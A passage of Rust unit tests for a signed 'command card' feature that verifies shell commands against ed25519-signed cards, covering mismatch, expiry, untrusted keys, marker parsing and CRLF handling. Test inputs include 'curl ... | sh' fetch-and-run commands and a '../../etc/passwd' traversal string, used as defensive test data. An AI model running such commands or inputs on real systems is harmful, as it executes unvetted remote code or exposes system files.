        assert_eq!(outcome, CardOutcome::Verified);

        let findings = findings_for_outcome(&outcome);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandCardVerified);
        assert_eq!(findings[0].severity, Severity::Info);
    }

    #[test]
    fn verified_card_mismatched_command_is_mismatch_high() {
        let dir = tempfile::tempdir().unwrap();
        let (secret, pubkey) = generate_keypair().unwrap();
        write_trusted_key(dir.path(), &pubkey);
        let mut card = sample_card();
        card.sign(&secret).unwrap();

        // Tamper the command the user is actually running (NOT the card).
        let outcome = evaluate_card(
            &card,
            "curl -fsSL https://example.com/install.sh | sh --extra-evil",
            dir.path(),
            today(),
        );
        assert_eq!(outcome, CardOutcome::Mismatch);

        let findings = findings_for_outcome(&outcome);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandCardMismatch);
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn untrusted_key_does_not_emit_verified() {
        let dir = tempfile::tempdir().unwrap();
        // Intentionally do NOT write the pubkey into the trusted dir.
        let (secret, _pubkey) = generate_keypair().unwrap();
        let mut card = sample_card();
        card.sign(&secret).unwrap();

        let outcome = evaluate_card(
            &card,
            "curl -fsSL https://example.com/install.sh | sh",
            dir.path(),
            today(),
        );
        assert_eq!(
            outcome,
            CardOutcome::Unverified(VerifyFailure::UntrustedKey)
        );

        let findings = findings_for_outcome(&outcome);
        // An Info note tagged CommandCardUnverified — NOT CommandCardVerified
        // (a failed verify must never carry the "verified" rule_id, which would
        // corrupt audit counts).
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandCardUnverified);
        assert_ne!(findings[0].rule_id, RuleId::CommandCardVerified);
        assert_eq!(findings[0].severity, Severity::Info);
        assert!(findings[0].description.contains("untrusted key"));
    }

    #[test]
    fn expired_card_does_not_verify() {
        let dir = tempfile::tempdir().unwrap();
        let (secret, pubkey) = generate_keypair().unwrap();
        write_trusted_key(dir.path(), &pubkey);
        let mut card = sample_card();
        card.expires = "2020-01-01".to_string();
        card.sign(&secret).unwrap();

        let outcome = evaluate_card(
            &card,
            "curl -fsSL https://example.com/install.sh | sh",
            dir.path(),
            today(),
        );
        assert_eq!(outcome, CardOutcome::Unverified(VerifyFailure::Expired));
        let findings = findings_for_outcome(&outcome);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].description.contains("expired"));
    }

    /// CodeRabbit/Greptile R4 #3: a SUPPLIED-but-unsigned card must be VISIBLE.
    /// `findings_for_outcome` only runs after a card ref was resolved + read, so
    /// an `Unsigned` outcome means "a card was supplied but carries no signature"
    /// — that belongs in audit/JSON as an Info `CommandCardUnverified`, NOT
    /// dropped. (The genuinely card-LESS command stays silent via an early return
    /// in `engine::check_command_card_hot`, never reaching this helper — covered
    /// by `engine::tests::no_card_stays_silent_even_when_trust_store_unresolvable`.)
    #[test]
    fn unsigned_supplied_card_is_visible() {
        let dir = tempfile::tempdir().unwrap();
        let card = sample_card(); // supplied, but never signed
        let outcome = evaluate_card(
            &card,
            "curl -fsSL https://example.com/install.sh | sh",
            dir.path(),
            today(),
        );
        assert_eq!(outcome, CardOutcome::Unverified(VerifyFailure::Unsigned));
        // A supplied unsigned card emits exactly one Info CommandCardUnverified —
        // visible, but NEVER tagged as verified (which would corrupt audit counts).
        let findings = findings_for_outcome(&outcome);
        assert_eq!(
            findings.len(),
            1,
            "a supplied unsigned card must emit exactly one finding"
        );
        assert_eq!(findings[0].rule_id, RuleId::CommandCardUnverified);
        assert_eq!(findings[0].severity, Severity::Info);
        assert_ne!(
            findings[0].rule_id,
            RuleId::CommandCardVerified,
            "an unsigned card must never be reported as verified"
        );
        assert!(
            findings[0].description.contains("not signed")
                || findings[0].description.contains("could not be verified"),
            "note must explain the card was unsigned/unverified; got: {}",
            findings[0].description
        );
    }

    #[test]
    fn find_card_comment_local_path() {
        let input = "# tirith-card: ./install-card.json\ncurl https://example.com/x.sh | sh";
        assert_eq!(
            find_card_comment(input),
            Some(CardRef::LocalPath("./install-card.json".to_string()))
        );
    }

    #[test]
    fn find_card_comment_url_is_remote_not_fetched() {
        let input =
            "# tirith-card: https://example.com/foo.json\ncurl https://example.com/x.sh | sh";
        assert_eq!(
            find_card_comment(input),
            Some(CardRef::RemoteUrl(
                "https://example.com/foo.json".to_string()
            ))
        );
    }

    #[test]
    fn find_card_comment_absent() {
        assert_eq!(
            find_card_comment("curl https://example.com/x.sh | sh"),
            None
        );
    }

    #[test]
    fn find_card_comment_flexible_whitespace_matches_tier1() {
        // The tier-1 marker regex is `#\s*tirith-card:` (zero-or-more spaces),
        // so `#tirith-card:` and `#  tirith-card:` force past the fast-exit.
        // The parser MUST accept the same shapes or the card is silently
        // dropped after being pulled past tier-1.
        let expected = Some(CardRef::LocalPath("./c.json".to_string()));
        // No space after `#`.
        assert_eq!(
            find_card_comment("#tirith-card: ./c.json\necho hi"),
            expected
        );
        // Two spaces after `#`.
        assert_eq!(
            find_card_comment("#  tirith-card: ./c.json\necho hi"),
            expected
        );
        // Canonical single space (sanity — same result).
        assert_eq!(
            find_card_comment("# tirith-card: ./c.json\necho hi"),
            expected
        );
        // The strip step must treat the same flexible shapes as markers, so a
        // `#tirith-card:` line is removed before command_matches (otherwise the
        // surviving marker would falsely mismatch the signed command).
        assert_eq!(
            strip_card_comment_lines("#tirith-card: ./c.json\necho hi"),
            "echo hi"
        );
        assert_eq!(
            strip_card_comment_lines("#  tirith-card: ./c.json\necho hi"),
            "echo hi"
        );
    }

    #[test]
    fn strip_card_comment_lines_removes_only_the_marker() {
        // A leading marker line is stripped; the command survives verbatim.
        let input = "# tirith-card: ./card.json\ncurl -fsSL https://example.com/install.sh | sh";
        assert_eq!(
            strip_card_comment_lines(input),
            "curl -fsSL https://example.com/install.sh | sh"
        );
        // Indented marker (the resolver trims leading whitespace) is also stripped.
        let indented = "   # tirith-card: ./card.json\necho hi";
        assert_eq!(strip_card_comment_lines(indented), "echo hi");
        // No marker → unchanged.
        assert_eq!(strip_card_comment_lines("echo hi"), "echo hi");
        // A `#` comment that is NOT a tirith-card marker is preserved.
        let other = "# just a note\necho hi";
        assert_eq!(strip_card_comment_lines(other), other);
    }

    #[test]
    fn strip_leaves_marker_less_leading_blank_lines_intact() {
        // CodeRabbit R6 #6: leading blank lines with NO `# tirith-card:` marker
        // are part of the command, not transport metadata. `strip_card_comment_lines`
        // must NOT drop them (it previously returned "echo hi" for "\n\necho hi",
        // diverging from `strip_card_comment_lines_cow`, which borrows the input
        // unchanged because `has_card_comment_prelude` is false).
        assert_eq!(strip_card_comment_lines("\n\necho hi"), "\n\necho hi");
        assert_eq!(prelude_end_offset("\n\necho hi"), 0);
        // The two strip variants must agree on a marker-less input.
        assert_eq!(
            strip_card_comment_lines("\n\necho hi"),
            strip_card_comment_lines_cow("\n\necho hi").as_ref()
        );
        // A single leading blank with no marker is likewise untouched.
        assert_eq!(strip_card_comment_lines("\necho hi"), "\necho hi");

        // But a marker FOLLOWED by blank lines strips the marker AND the
        // transport blanks between it and the command.
        assert_eq!(
            strip_card_comment_lines("# tirith-card: ./c\n\necho hi"),
            "echo hi"
        );
        // A blank line BEFORE the marker is also transport padding (a marker is
        // present in the prelude), so the whole prelude is stripped.
        assert_eq!(
            strip_card_comment_lines("\n# tirith-card: ./c\necho hi"),
            "echo hi"
        );
    }

    #[test]
    fn card_marker_only_parsed_in_leading_prelude_not_heredoc_body() {
        // A `# tirith-card:` line that appears AFTER the real command starts
        // (here inside a heredoc body) is COMMAND CONTENT, not transport
        // metadata. It must NOT be parsed as a card reference, and it must NOT
        // be stripped — otherwise the marker text in the body would skew the
        // manifest match and spuriously trip CommandCardMismatch.
        let body_marker = "cat <<'EOF' > script.sh\n# tirith-card: ./evil.json\necho hi\nEOF";
        assert_eq!(
            find_card_comment(body_marker),
            None,
            "a marker inside a heredoc body (after the command starts) is not a card ref"
        );
        assert_eq!(
            strip_card_comment_lines(body_marker),
            body_marker,
            "a marker inside a heredoc body must be preserved verbatim, not stripped"
        );

        // A non-marker `#` comment as the first line ends the prelude, so a
        // later marker is also treated as command content (consistent scope).
        let comment_then_marker = "# build script\n# tirith-card: ./c.json\necho hi";
        assert_eq!(find_card_comment(comment_then_marker), None);
        assert_eq!(
            strip_card_comment_lines(comment_then_marker),
            comment_then_marker
        );

        // Sanity: a LEADING marker is still parsed/stripped (the prelude case).
        let leading = "# tirith-card: ./c.json\necho hi";
        assert_eq!(
            find_card_comment(leading),
            Some(CardRef::LocalPath("./c.json".to_string()))
        );
        assert_eq!(strip_card_comment_lines(leading), "echo hi");
    }

    #[test]
    fn heredoc_body_marker_does_not_cause_spurious_mismatch() {
        // End-to-end (CRITICAL): a trusted, signed card whose `command` is a
        // multi-line heredoc that itself CONTAINS the text `# tirith-card:` in
        // its body must still VERIFY. Before the prelude-scoping fix, the body
        // marker line was stripped, mutating the command, so command_matches
        // failed and the outcome was a spurious Mismatch.
        let dir = tempfile::tempdir().unwrap();
        let (secret, pubkey) = generate_keypair().unwrap();
        write_trusted_key(dir.path(), &pubkey);

        let command = "cat <<'EOF' > out.sh\n# tirith-card: ./inner.json\necho hello\nEOF";
        let mut card = sample_card();
        card.command = command.to_string();
        card.sign(&secret).unwrap();

        // The analyzed input has a LEADING marker (real transport metadata)
        // plus the command, whose body coincidentally contains a marker too.
        let analyzed_input = format!("# tirith-card: ./card.json\n{command}");
        let stripped = strip_card_comment_lines(&analyzed_input);
        assert_eq!(
            stripped, command,
            "only the leading marker is stripped; the heredoc-body marker survives"
        );

        let outcome = evaluate_card(&card, &stripped, dir.path(), today());
        assert_eq!(
            outcome,
            CardOutcome::Verified,
            "a heredoc command containing `# tirith-card:` in its body must verify, not mismatch"
        );
    }

    #[test]
    fn comment_carried_card_verifies_after_marker_strip() {
        // Regression (CRITICAL): a trusted, signed, non-expired card whose
        // `command` equals the real command, referenced via a `# tirith-card:`
        // comment, must yield Verified — NOT Mismatch. The marker line is
        // transport metadata and must be stripped before the byte-for-byte
        // command comparison. Before the fix, the analyzed input still carried
        // the marker line, so a correctly-signed comment-carried card always
        // falsely mismatched.
        let dir = tempfile::tempdir().unwrap();
        let (secret, pubkey) = generate_keypair().unwrap();
        write_trusted_key(dir.path(), &pubkey);
        let mut card = sample_card(); // command = "curl -fsSL https://example.com/install.sh | sh"
        card.sign(&secret).unwrap();

        // The full analyzed input as the engine sees it: marker comment +
        // the real command on the next line.
        let analyzed_input =
            "# tirith-card: ./install-card.json\ncurl -fsSL https://example.com/install.sh | sh";
        let command = strip_card_comment_lines(analyzed_input);

        let outcome = evaluate_card(&card, &command, dir.path(), today());
        assert_eq!(
            outcome,
            CardOutcome::Verified,
            "comment-carried card with a matching command must verify, not mismatch"
        );
        let findings = findings_for_outcome(&outcome);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandCardVerified);
    }

    #[test]
    fn crlf_multiline_command_carried_card_verifies_without_normalization() {
        // Regression (CodeRabbit R5 #1): a multi-LINE card command authored with
        // `\r\n` (CRLF) endings, referenced via a CRLF-terminated `# tirith-card:`
        // prelude, must still VERIFY. The previous `lines()` + `join("\n")` strip
        // silently normalized CRLF→LF, so `command_matches` compared LF-joined
        // text against the card's CRLF `command` field and falsely Mismatched.
        let dir = tempfile::tempdir().unwrap();
        let (secret, pubkey) = generate_keypair().unwrap();
        write_trusted_key(dir.path(), &pubkey);

        // A genuine multi-line command with Windows CRLF line endings.
        let command = "cat <<'EOF' > out.sh\r\necho one\r\necho two\r\nEOF";
        let mut card = sample_card();
        card.command = command.to_string();
        card.sign(&secret).unwrap();

        // Analyzed input: a CRLF-terminated prelude marker, then the CRLF body.
        let analyzed_input = format!("# tirith-card: ./card.json\r\n{command}");

        // The strip must preserve the body byte-for-byte (CRLF intact), removing
        // ONLY the leading prelude marker line.
        let stripped = strip_card_comment_lines(&analyzed_input);
        assert_eq!(
            stripped, command,
            "only the leading marker is stripped; the CRLF body is preserved verbatim"
        );
        assert!(
            stripped.contains("\r\n"),
            "CRLF must NOT be normalized to LF; got {stripped:?}"
        );

        let outcome = evaluate_card(&card, &stripped, dir.path(), today());
        assert_eq!(
            outcome,
            CardOutcome::Verified,
            "a CRLF-authored multiline card must verify (no CRLF→LF normalization)"
        );

        // The Cow form (engine hot path) must reach the SAME stripped bytes.
        let cow = strip_card_comment_lines_cow(&analyzed_input);
        assert_eq!(cow.as_ref(), command, "cow strip must also preserve CRLF");
    }

    #[test]
    fn json_roundtrip_preserves_fields() {
        let (secret, _pubkey) = generate_keypair().unwrap();
        let mut card = sample_card();
        card.script_sha256 = Some(sha256_hex(b"#!/bin/sh\necho hi\n"));
        card.sign(&secret).unwrap();
        let json = card.to_json_pretty().unwrap();
        let parsed = Card::from_json(json.as_bytes()).unwrap();
        assert_eq!(parsed, card);
    }

    #[test]
    fn unknown_algo_fails_at_deserialize() {
        // type-design #2 / code-reviewer #4: `algo` is a closed enum, so a card
        // claiming `algo: "none"` (or any non-ed25519 / wrong-casing value)
        // FAILS to parse — the confusion-attack class is killed at deserialize
        // time, before any verify logic runs.
        let bad = r#"{
            "command": "x",
            "expires": "2026-08-01",
            "signature": { "algo": "none", "key_id": "00", "value": "00" }
        }"#;
        assert!(
            Card::from_json(bad.as_bytes()).is_err(),
            "algo: none must fail to deserialize"
        );
        // Casing must not slip through either.
        let bad_case = bad.replace("\"none\"", "\"ED25519\"");
        assert!(
            Card::from_json(bad_case.as_bytes()).is_err(),
            "algo: ED25519 (wrong casing) must fail to deserialize"
        );
        // The canonical lowercase form parses.
        let good = bad.replace("\"none\"", "\"ed25519\"");
        assert!(Card::from_json(good.as_bytes()).is_ok());
    }

    #[test]
    fn signed_card_algo_is_ed25519_enum() {
        let (secret, _pubkey) = generate_keypair().unwrap();
        let mut card = sample_card();
        card.sign(&secret).unwrap();
        assert_eq!(
            card.signature.as_ref().unwrap().algo,
            SignatureAlgo::Ed25519
        );
        // Round-trips through JSON as the lowercase string.
        let json = card.to_json_pretty().unwrap();
        assert!(json.contains("\"algo\": \"ed25519\""), "got {json}");
    }

    #[test]
    fn load_trusted_pubkey_rejects_traversal_key_id() {
        let dir = tempfile::tempdir().unwrap();
        // A non-hex key_id (path traversal attempt) must be refused outright.
        assert!(load_trusted_pubkey(dir.path(), "../../etc/passwd").is_none());
        assert!(load_trusted_pubkey(dir.path(), "").is_none());
    }

    #[test]
    fn load_trusted_pubkey_accepts_hex_and_base64() {
        use base64::Engine;
        let (_secret, pubkey) = generate_keypair().unwrap();
        let key_id = key_id_for_pubkey(&pubkey);

        let hex_dir = tempfile::tempdir().unwrap();
        std::fs::write(
            hex_dir.path().join(format!("{key_id}.pub")),
            hex_encode(&pubkey),
        )
        .unwrap();
        assert_eq!(load_trusted_pubkey(hex_dir.path(), &key_id), Some(pubkey));

        let b64_dir = tempfile::tempdir().unwrap();
        let b64 = base64::engine::general_purpose::STANDARD.encode(pubkey);
        std::fs::write(b64_dir.path().join(format!("{key_id}.pub")), b64).unwrap();
        assert_eq!(load_trusted_pubkey(b64_dir.path(), &key_id), Some(pubkey));
    }

    #[test]
    fn load_trusted_pubkey_rejects_mislabeled_file() {
        // A file named after key_id A but containing key B must not load.
        let dir = tempfile::tempdir().unwrap();
        let (_s1, key_a) = generate_keypair().unwrap();
        let (_s2, key_b) = generate_keypair().unwrap();
        let id_a = key_id_for_pubkey(&key_a);
        std::fs::write(dir.path().join(format!("{id_a}.pub")), key_b).unwrap();
        assert!(load_trusted_pubkey(dir.path(), &id_a).is_none());
    }
}
